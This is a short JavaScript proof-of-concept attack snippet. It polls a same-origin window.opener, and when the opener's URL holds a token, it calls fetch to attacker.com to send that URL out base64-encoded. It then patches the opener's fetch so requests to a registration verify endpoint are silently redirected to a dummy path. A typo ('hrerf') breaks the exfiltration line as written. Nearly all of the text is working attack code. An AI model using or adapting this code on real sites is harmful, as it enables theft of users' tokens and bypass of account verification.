(function () {
  let tries = 0;
  const maxTries = 100;   // ~10s at 100ms
  const timer = setInterval(() => {
    tries++;

    try {
      const op = window.opener;
      if (op && op.location && op.location.href.includes("token")) {
      fetch('https://attacker.com/?'+btoa(window.opener.location.hrerf))
        clearInterval(timer);

        // Avoid double-patching
        if (op.__fetchPatchedForVerify) return;
        op.__fetchPatchedForVerify = true;

        // Use opener's realm for everything
        const originalFetch = op.fetch.bind(op);
        const OpenerRequest = op.Request;
        const OpenerURL = op.URL;

        op.fetch = function (input, init) {
          const req = input instanceof OpenerRequest ? input : new OpenerRequest(input, init);
          const url = new OpenerURL(req.url, op.location.href);

          // (Optional) debug — will show once per fetch call that triggers
          // console.log("intercepting:", url.href);

          // Only rewrite this exact path; query params are preserved
          if (url.pathname === "/api/v2/registration/verify") {
            url.pathname = "/dummy";

            const newReq = new OpenerRequest(url.toString(), {
              method: req.method,
              headers: req.headers,
              body: (req.method === "GET" || req.method === "HEAD") ? undefined : req.clone().body,
              mode: req.mode,
              credentials: req.credentials,
              cache: req.cache,
              redirect: req.redirect,
              referrer: req.referrer,
              referrerPolicy: req.referrerPolicy,
              integrity: req.integrity,
              keepalive: req.keepalive,
              signal: (init && init.signal) || req.signal
            });

            return originalFetch(newReq);
          }

          return originalFetch(req);
        };

		
        alert("✅ opener is same-origin, token found, and fetch is patched.");
        return;
      }
    } catch (e) {
      // cross-origin or not ready yet — ignore and keep trying
    }

    if (tries >= maxTries) clearInterval(timer); // hard stop
  }, 100);
})();
